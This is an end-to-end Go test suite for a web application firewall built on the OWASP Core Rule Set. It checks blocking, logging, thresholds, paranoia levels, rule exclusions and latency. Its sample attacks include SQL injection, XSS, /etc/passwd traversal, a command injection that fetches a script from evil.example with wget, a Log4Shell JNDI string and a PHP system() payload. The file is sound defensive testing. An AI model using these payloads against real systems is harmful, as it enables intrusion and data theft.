//go:build e2e

package e2e

import (
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"slices"
	"sort"
	"strings"
	"sync"
	"testing"
	"time"
)

// crsHeaders are the headers of a browser, with a host name: rule 920350
// scores 3 for a numeric Host, which the tests do not want by accident.
var crsHeaders = with(browserHeaders, "Host", "app.example")

// crsRequest is a request of the CRS tests.
type crsRequest struct {
	name                  string
	method, path          string
	contentType, body     string
	headers               []string // extra headers, name and value
	status                int      // expected status
	category, rule, field string   // expected audit event, if blocked
	reason                string   // expected audit reason; default "crs"
}

func (r crsRequest) send(c *client) response {
	c.t.Helper()
	method := r.method
	if method == "" {
		method = "GET"
	}
	return c.send(method, r.path, r.contentType, r.body, r.headers...)
}

// check sends the request and checks the response, the audit event, and
// that allowed requests reach the backend unchanged.
func (r crsRequest) check(t *testing.T, w *waf, c *client) {
	t.Helper()
	resp := r.send(c)
	if resp.StatusCode != r.status {
		t.Errorf("%s: status %d, want %d\n%s", r.name, resp.StatusCode, r.status, resp.body)
		return
	}
	if r.status == http.StatusOK {
		h := resp.hit(t)
		if h.URI != r.path || h.Body != r.body {
			t.Errorf("%s: backend saw %s %q", r.name, h.URI, h.Body)
		}
		return
	}
	if r.status == http.StatusRequestHeaderFieldsTooLarge {
		return // not logged
	}
	e := w.eventByID(t, eventID(t, resp))
	reason := r.reason
	if reason == "" {
		reason = "crs"
	}
	if e.Reason != reason || e.Action != "block" || e.Rule == nil && reason != "body_too_large" {
		t.Errorf("%s: event %+v", r.name, e)
		return
	}
	if r.category != "" && e.Rule.Category != r.category || r.rule != "" && e.Rule.ID != r.rule ||
		r.field != "" && (e.Match == nil || e.Match.Field != r.field) {
		t.Errorf("%s: rule %+v, match %+v; want rule %s, category %s, field %s", r.name, e.Rule, e.Match, r.rule, r.category, r.field)
	}
	if reason == "crs" && r.status == http.StatusForbidden &&
		(e.CRS == nil || e.CRS.DecidingRule != 949110 || e.CRS.AnomalyScore < 5 || len(e.CRS.Rules) == 0) {
		t.Errorf("%s: crs %+v", r.name, e.CRS)
	}
}

const sqli = "/search?q=1%27%20OR%20%271%27=%271"

// attacks are blocked by the CRS at the default settings.
var attacks = []crsRequest{
	{name: "SQL injection", path: sqli, status: 403, category: "sqli", field: "q"},
	{name: "UNION SELECT", path: "/item?id=1%20UNION%20SELECT%20username,password%20FROM%20users--", status: 403, category: "sqli"},
	{name: "XSS", path: "/?q=%3Cscript%3Ealert(1)%3C/script%3E", status: 403, category: "xss"},
	{name: "path traversal", path: "/download?file=../../../../etc/passwd", status: 403, category: "lfi"},
	{name: "command injection", path: "/ping?host=127.0.0.1;wget%20http://evil.example/x.sh", status: 403, category: "rce"},
	{name: "Log4Shell", path: "/?x=$%7Bjndi:ldap://evil.example/a%7D", status: 403, category: "rce"},
	{name: "SQL injection in a form", method: "POST", path: "/login", contentType: "application/x-www-form-urlencoded",
		body: "user=admin%27--&pw=x", status: 403, category: "sqli", field: "user"},
	{name: "XSS in JSON", method: "POST", path: "/api/comments", contentType: "application/json",
		body: `{"comment":"<img src=x onerror=alert(1)>"}`, status: 403, category: "xss", field: "json.comment"},
	{name: "SQL injection in nested JSON", method: "POST", path: "/api/users", contentType: "application/json",
		body: `{"user":{"name":"1' OR '1'='1"}}`, status: 403, category: "sqli", rule: "942100", field: "json.user.name"},
	{name: "PHP injection in XML", method: "POST", path: "/api/orders", contentType: "application/xml",
		body: `<a>&lt;?php system($_GET['c']); ?&gt;</a>`, status: 403, category: "injection-php"},
	{name: "SQL injection in multipart", method: "POST", path: "/upload", contentType: "multipart/form-data; boundary=XyZ",
		body: "--XyZ\r\nContent-Disposition: form-data; name=\"title\"\r\n\r\n1' OR '1'='1\r\n--XyZ--\r\n", status: 403, category: "sqli", field: "title"},
	{name: "SQL injection in a cookie", path: "/", headers: []string{"Cookie", "session=1' OR '1'='1"}, status: 403, category: "sqli"},
	{name: "SQL injection in unclosed XML", method: "POST", path: "/api/orders", contentType: "application/xml",
		body: `<a><b>1' UNION SELECT password FROM users--</a>`, status: 403, category: "sqli"},
	{name: "XSS in a body that is not XML", method: "POST", path: "/api/orders", contentType: "application/xml",
		body: `<a><script>alert(1)</script>`, status: 403, category: "xss"},
	{name: "scanner", path: "/", headers: []string{"User-Agent", "sqlmap/1.8#stable (https://sqlmap.org)"}, status: 403, rule: "913100"},
}

// cleanRequests are normal requests that must reach the backend.
var cleanRequests = []crsRequest{
	{name: "page", path: "/products?category=books&sort=price&page=2", status: 200},
	{name: "apostrophe", path: "/search?q=O%27Brien%27s+pub", status: 200},
	{name: "Japanese text", path: "/search?q=%E6%9D%B1%E4%BA%AC%E3%81%AE%E5%A4%A9%E6%B0%97", status: 200},
	{name: "form", method: "POST", path: "/contact", contentType: "application/x-www-form-urlencoded",
		body: "name=Alice&message=Hello%2C+I+would+like+a+quote.", status: 200},
	{name: "JSON", method: "POST", path: "/api/orders", contentType: "application/json",
		body: `{"item":"book","qty":2,"note":"gift wrap, please"}`, status: 200},
	{name: "large JSON", method: "POST", path: "/api/orders", contentType: "application/json",
		body: `{"items":[` + strings.Repeat(`{"id":12345,"name":"O'Brien's item","desc":"plain text"},`, 100) + `{}]}`, status: 200},
	{name: "XML", method: "POST", path: "/api/orders", contentType: "application/xml",
		body: `<order><item>book</item><qty>2</qty></order>`, status: 200},
	{name: "multipart", method: "POST", path: "/upload", contentType: "multipart/form-data; boundary=XyZ",
		body: "--XyZ\r\nContent-Disposition: form-data; name=\"title\"\r\n\r\nHoliday photos\r\n--XyZ--\r\n", status: 200},
	{name: "OPTIONS", method: "OPTIONS", path: "/api/orders", status: 200},
}

func TestCRSDefaults(t *testing.T) {
	w := startWAF(t, wafOptions{args: []string{"-engine", "crs"}})
	w.waitLog(t, `msg="OWASP CRS loaded" version=4.25.0 paranoia_level=1 anomaly_threshold=5 max_args=1000`)
	c := w.client(t, crsHeaders)
	for _, r := range attacks {
		r.check(t, w, c)
	}
	for _, r := range cleanRequests {
		r.check(t, w, c)
	}
	// The response contains only the event ID.
	r := c.get(sqli)
	if !strings.HasPrefix(r.body, "Forbidden\nEvent ID: ") || strings.Contains(r.body, "942100") {
		t.Errorf("response %q", r.body)
	}
	// Clean requests are not logged.
	for _, e := range w.events(t) {
		if e.Request.Method == "OPTIONS" || strings.HasPrefix(e.Request.URI, "/products") {
			t.Errorf("clean request logged: %+v", e)
		}
	}
}

func TestCRSRejections(t *testing.T) {
	w := startWAF(t, wafOptions{args: []string{"-engine", "crs", "-crs-max-args", "20", "-max-body", "4096"}})
	c := w.client(t, crsHeaders)
	args := func(n int) string {
		var b strings.Builder
		for i := range n {
			fmt.Fprintf(&b, "f%d=x&", i)
		}
		return strings.TrimSuffix(b.String(), "&")
	}
	for _, r := range []crsRequest{
		{name: "invalid JSON", method: "POST", path: "/api", contentType: "application/json", body: `{"user":`, status: 400, rule: "200002"},
		{name: "invalid XML", method: "POST", path: "/api", contentType: "application/xml", body: `<a></b>`, status: 400, rule: "200002"},
		// Coraza's XML parser accepts unclosed elements and text.
		{name: "unclosed XML", method: "POST", path: "/api", contentType: "application/xml", body: `<a><b></a>`, status: 200},
		{name: "invalid multipart", method: "POST", path: "/upload", contentType: "multipart/form-data", body: "garbage", status: 400, rule: "200002"},
		{name: "unterminated multipart", method: "POST", path: "/upload", contentType: "multipart/form-data; boundary=XyZ",
			body: "--XyZ\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\nx", status: 400, rule: "200003"},
		{name: "20 arguments", method: "POST", path: "/form", contentType: "application/x-www-form-urlencoded", body: args(20), status: 200},
		{name: "21 arguments", method: "POST", path: "/form", contentType: "application/x-www-form-urlencoded", body: args(21), status: 400, rule: "9500001"},
		{name: "arguments in query and body", method: "POST", path: "/form?" + args(15), contentType: "application/x-www-form-urlencoded", body: args(6), status: 400, rule: "9500001"},
		{name: "JSON array", method: "POST", path: "/api", contentType: "application/json", body: "[" + strings.Repeat("1,", 20) + "1]", status: 400, rule: "9500001"},
		{name: "body at the limit", method: "POST", path: "/api", contentType: "application/json", body: `{"a":"` + strings.Repeat("x", 4096-8) + `"}`, status: 200},
		{name: "body too large", method: "POST", path: "/api", contentType: "application/json", body: `{"a":"` + strings.Repeat("x", 4096) + `"}`, status: 413, reason: "body_too_large"},
		{name: "DELETE", method: "DELETE", path: "/api/items/1", status: 403, rule: "911100"},
		{name: "text/plain body", method: "POST", path: "/api", contentType: "text/plain", body: "hello", status: 403, rule: "920420"},
		{name: "60 KiB header", path: "/", headers: []string{"X-Big", strings.Repeat("a", 60<<10)}, status: 200},
	} {
		r.check(t, w, c)
	}
	// Go's limit is 64 KiB plus a margin of a few KiB, which is a little
	// larger on a reused connection; 100 KiB is over it either way.
	huge := crsRequest{name: "100 KiB header", path: "/", headers: []string{"X-Big", strings.Repeat("a", 100<<10)}, status: 431}
	huge.check(t, w, w.client(t, crsHeaders))
	huge.check(t, w, c)
}

func TestCRSDetectMode(t *testing.T) {
	w := startWAF(t, wafOptions{args: []string{"-engine", "crs", "-mode", "detect"}})
	c := w.client(t, crsHeaders)
	for _, a := range attacks[:9] {
		r := a.send(c)
		h := r.hit(t)
		if h.Body != a.body {
			t.Errorf("%s: backend saw %q", a.name, h.Body)
		}
	}
	n := 0
	for _, e := range w.events(t) {
		if e.Reason != "crs" || e.Action != "detect" || e.CRS == nil {
			t.Errorf("event %+v", e)
		}
		n++
	}
	if n != 9 {
		t.Errorf("%d events, want 9", n)
	}
}

func TestCRSAnomalyThreshold(t *testing.T) {
	// One warning (rule 920350, 3 points: numeric Host) blocks at 3.
	w := startWAF(t, wafOptions{args: []string{"-engine", "crs", "-crs-anomaly-threshold", "3"}})
	c := w.client(t, crsHeaders)
	c.get("/", "Host", "app.example").hit(t)
	r := c.get("/", "Host", "127.0.0.1")
	if r.StatusCode != 403 {
		t.Fatalf("numeric Host at threshold 3: %d", r.StatusCode)
	}
	if e := w.eventByID(t, eventID(t, r)); e.CRS.AnomalyScore != 3 || e.Rule.ID != "920350" {
		t.Errorf("event %+v %+v", e.Rule, e.CRS)
	}
	// At the default, it does not, but one critical rule does.
	w = startWAF(t, wafOptions{args: []string{"-engine", "crs"}})
	c = w.client(t, crsHeaders)
	c.get("/", "Host", "127.0.0.1").hit(t)
	if r := c.send("DELETE", "/api/items/1", "", ""); r.StatusCode != 403 {
		t.Errorf("DELETE at threshold 5: %d", r.StatusCode)
	}
	// At 10, one critical rule (score 5) passes, two do not.
	w = startWAF(t, wafOptions{args: []string{"-engine", "crs", "-crs-anomaly-threshold", "10"}})
	c = w.client(t, crsHeaders)
	c.send("DELETE", "/api/items/1", "", "").hit(t)
	if r := c.get(attacks[1].path); r.StatusCode != 403 {
		t.Errorf("UNION SELECT at threshold 10: %d", r.StatusCode)
	}
}

func TestCRSParanoiaLevel(t *testing.T) {
	// Rule 942430 (restricted SQL character anomaly) is at paranoia level 2.
	target := "/?q=" + strings.Repeat("%27%28", 12)
	backend := startBackend(t).URL
	pl1 := startWAF(t, wafOptions{backend: backend, args: []string{"-engine", "crs"}})
	pl2 := startWAF(t, wafOptions{backend: backend, args: []string{"-engine", "crs", "-crs-paranoia-level", "2"}})
	pl1.client(t, crsHeaders).get(target).hit(t)
	r := pl2.client(t, crsHeaders).get(target)
	if r.StatusCode != 403 {
		t.Fatalf("PL2: %d", r.StatusCode)
	}
	e := pl2.eventByID(t, eventID(t, r))
	if !slices.ContainsFunc(e.CRS.Rules, func(r crsRule) bool { return r.ID == 942430 }) {
		t.Errorf("rules %+v", e.CRS.Rules)
	}
	// Paranoia level 2 has false positives on free text (see
	// docs/testing.md); the other clean requests pass.
	c := pl2.client(t, crsHeaders)
	for _, r := range cleanRequests {
		resp := r.send(c)
		if resp.StatusCode == http.StatusOK {
			continue
		}
		var ids []int
		for _, m := range pl2.eventByID(t, eventID(t, resp)).CRS.Rules {
			ids = append(ids, m.ID)
		}
		t.Logf("PL2 false positive: %s %q: rules %v", r.name, r.path+" "+r.body[:min(len(r.body), 40)], ids)
		if !slices.Contains([]string{"apostrophe", "JSON", "large JSON"}, r.name) {
			t.Errorf("%s: unexpected false positive", r.name)
		}
	}
}

// TestCRSExclusions runs the use cases of docs/crs.md.
func TestCRSExclusions(t *testing.T) {
	before := writeFile(t, "before.conf", `
SecAction "id:1000,phase:1,pass,nolog,\
    setvar:'tx.allowed_methods=GET HEAD POST OPTIONS PUT PATCH DELETE'"
SecAction "id:1001,phase:1,pass,nolog,\
    setvar:'tx.allowed_request_content_type=|application/x-www-form-urlencoded| |multipart/form-data| |multipart/related| |text/xml| |application/xml| |application/soap+xml| |application/json| |application/cloudevents+json| |application/cloudevents-batch+json| |text/plain|'"
SecRule REQUEST_FILENAME "@beginsWith /cms/" \
    "id:1002,phase:1,pass,nolog,ctl:ruleRemoveTargetByTag=attack-xss;ARGS:json.content"
SecRule REQUEST_FILENAME "@beginsWith /search" \
    "id:1003,phase:1,pass,nolog,ctl:ruleRemoveById=942100"
SecRule REMOTE_ADDR "@ipMatch 10.0.0.50" \
    "id:1004,phase:1,pass,nolog,ctl:ruleRemoveById=913100"
SecRule REQUEST_FILENAME "@beginsWith /legacy/" \
    "id:1005,phase:1,pass,nolog,setvar:tx.inbound_anomaly_score_threshold=10"
`)
	// Two files loaded with a glob.
	afterDir := t.TempDir()
	os.WriteFile(filepath.Join(afterDir, "10-password.conf"), []byte(`SecRuleUpdateTargetByTag "attack-sqli" "!ARGS:password"`+"\n"), 0o644)
	os.WriteFile(filepath.Join(afterDir, "20-host.conf"), []byte("SecRuleRemoveById 920350\n"), 0o644)

	w := startWAF(t, wafOptions{args: []string{
		"-engine", "crs", "-trusted-proxies", "127.0.0.1", "-crs-anomaly-threshold", "3",
		"-crs-rules-before", before, "-crs-rules-after", filepath.Join(afterDir, "*.conf"),
	}})
	c := w.client(t, crsHeaders)
	xss := `"<b onmouseover=alert(1)>hi</b>"`
	sqlmap := []string{"User-Agent", "sqlmap/1.8#stable (https://sqlmap.org)"}
	for _, r := range []crsRequest{
		// Allow PUT, PATCH and DELETE for a REST API.
		{name: "DELETE", method: "DELETE", path: "/api/items/1", status: 200},
		{name: "PUT", method: "PUT", path: "/api/items/1", contentType: "application/json", body: `{"qty":3}`, status: 200},
		{name: "PATCH", method: "PATCH", path: "/api/items/1", contentType: "application/json", body: `{"qty":3}`, status: 200},
		// Accept other content types.
		{name: "text/plain", method: "POST", path: "/api/notes", contentType: "text/plain", body: "hello", status: 200},
		// Accept HTML in one field of one endpoint.
		{name: "HTML in /cms/ content", method: "POST", path: "/cms/pages", contentType: "application/json", body: `{"content":` + xss + `}`, status: 200},
		{name: "HTML in /cms/ title", method: "POST", path: "/cms/pages", contentType: "application/json", body: `{"title":` + xss + `}`, status: 403, category: "xss", field: "json.title"},
		{name: "HTML in /api/ content", method: "POST", path: "/api/pages", contentType: "application/json", body: `{"content":` + xss + `}`, status: 403, category: "xss", field: "json.content"},
		{name: "SQL injection in /cms/ content", method: "POST", path: "/cms/pages", contentType: "application/json", body: `{"content":"1' OR '1'='1"}`, status: 403, category: "sqli"},
		// Exclude a parameter everywhere.
		{name: "password", method: "POST", path: "/login", contentType: "application/x-www-form-urlencoded", body: "user=alice&password=1%27+OR+%271%27%3D%271", status: 200},
		{name: "user", method: "POST", path: "/login", contentType: "application/x-www-form-urlencoded", body: "user=1%27+OR+%271%27%3D%271&password=x", status: 403, category: "sqli", field: "user"},
		// Disable a rule: a numeric Host, which alone would block at
		// threshold 3.
		{name: "numeric Host", path: "/health", headers: []string{"Host", "10.1.2.3"}, status: 200},
		// Disable a rule for some paths.
		{name: "SQL injection on /search", path: sqli, status: 200},
		{name: "SQL injection elsewhere", path: strings.Replace(sqli, "/search", "/other", 1), status: 403, rule: "942100"},
		// Let an internal security scanner through.
		{name: "scanner from 10.0.0.50", path: "/", headers: append([]string{"X-Forwarded-For", "10.0.0.50"}, sqlmap...), status: 200},
		{name: "scanner from 10.0.0.51", path: "/", headers: append([]string{"X-Forwarded-For", "10.0.0.51"}, sqlmap...), status: 403, rule: "913100"},
		{name: "scanner payload from 10.0.0.50", path: "/item?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
			headers: append([]string{"X-Forwarded-For", "10.0.0.50"}, sqlmap...), status: 403, category: "sqli"},
		// Raise the threshold for one path. At the global threshold of 3,
		// a critical rule (5) blocks everywhere else.
		{name: "one critical rule on /legacy/", path: "/legacy/item?id=1%27%20OR%20%271%27=%271", status: 200},
		{name: "one critical rule elsewhere", path: "/item?id=1%27%20OR%20%271%27=%271", status: 403, rule: "942100"},
	} {
		r.check(t, w, c)
	}
}

func TestCRSEngineBoth(t *testing.T) {
	w := startWAF(t, wafOptions{args: []string{"-engine", "both"}})
	c := w.client(t, crsHeaders)
	for _, r := range []crsRequest{
		// Blocked by the signatures first, and logged once.
		{name: "SQL injection", path: attacks[1].path, status: 403, reason: "signature"},
		// Only the CRS has a rule for these.
		{name: "DELETE", method: "DELETE", path: "/api/items/1", status: 403, rule: "911100"},
		{name: "text/plain", method: "POST", path: "/api", contentType: "text/plain", body: "hello", status: 403, rule: "920420"},
	} {
		r.check(t, w, c)
	}
	for _, r := range cleanRequests {
		r.check(t, w, c)
	}
	if n := len(w.events(t)); n != 3 {
		t.Errorf("%d events, want 3", n)
	}
}

func TestCRSConcurrent(t *testing.T) {
	w := startWAF(t, wafOptions{args: []string{"-engine", "crs"}})
	var wg sync.WaitGroup
	for i := range 32 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			c := w.client(t, crsHeaders)
			for j := range 10 {
				if (i+j)%2 == 0 {
					attacks[(i+j)%len(attacks)].check(t, w, c)
				} else {
					cleanRequests[(i+j)%len(cleanRequests)].check(t, w, c)
				}
			}
		}()
	}
	wg.Wait()
}

func TestCRSInvalidFlags(t *testing.T) {
	include := writeFile(t, "include.conf", "Include other.conf\n")
	invalid := writeFile(t, "invalid.conf", "SecNoSuchDirective On\n")
	for _, tc := range []struct {
		args []string
		want string
	}{
		{[]string{"-engine", "modsecurity"}, `invalid -engine`},
		{[]string{"-engine", "crs", "-crs-paranoia-level", "5"}, "paranoia"},
		{[]string{"-engine", "crs", "-crs-anomaly-threshold", "-1"}, "threshold"},
		{[]string{"-engine", "crs", "-crs-max-args", "-1"}, "argument limit"},
		{[]string{"-crs-rules-after", invalid}, "-crs-rules-before and -crs-rules-after require -engine crs or both"},
		{[]string{"-engine", "crs", "-crs-rules-after", "/nonexistent/*.conf"}, "/nonexistent/*.conf"},
		{[]string{"-engine", "crs", "-crs-rules-after", include}, "Include"},
		{[]string{"-engine", "crs", "-crs-rules-before", invalid}, invalid + `: invalid WAF config from string: unknown directive \"secnosuchdirective\"`},
	} {
		out, err := runWAF(t, tc.args...)
		if err == nil || !strings.Contains(out, tc.want) {
			t.Errorf("%v: %v, output\n%s\nwant %q", tc.args, err, out, tc.want)
		}
	}
}

// TestCRSLatency measures the latency added by each engine through the
// binary, for the results in docs/testing.md. It only fails if a request
// is not served.
func TestCRSLatency(t *testing.T) {
	backend := startBackend(t).URL
	json := `{"items":[` + strings.Repeat(`{"id":12345,"name":"Brian's item","desc":"plain text description"},`, 300) + `{}]}`
	for _, engine := range []string{"builtin", "crs", "both"} {
		w := startWAF(t, wafOptions{backend: backend, args: []string{"-engine", engine, "-max-body", "1048576"}})
		c := w.client(t, crsHeaders)
		for _, r := range []crsRequest{
			{name: "typical GET", path: "/products?category=books&sort=price&page=2", status: 200},
			{name: fmt.Sprintf("%d KiB JSON", len(json)>>10), method: "POST", path: "/api/orders", contentType: "application/json", body: json, status: 200},
		} {
			var times []time.Duration
			for range 21 {
				start := time.Now()
				r.send(c).hit(t)
				times = append(times, time.Since(start))
			}
			sort.Slice(times, func(i, j int) bool { return times[i] < times[j] })
			t.Logf("%-7s %-12s median %v, p90 %v", engine, r.name, times[10].Round(10*time.Microsecond), times[18].Round(10*time.Microsecond))
		}
	}
}
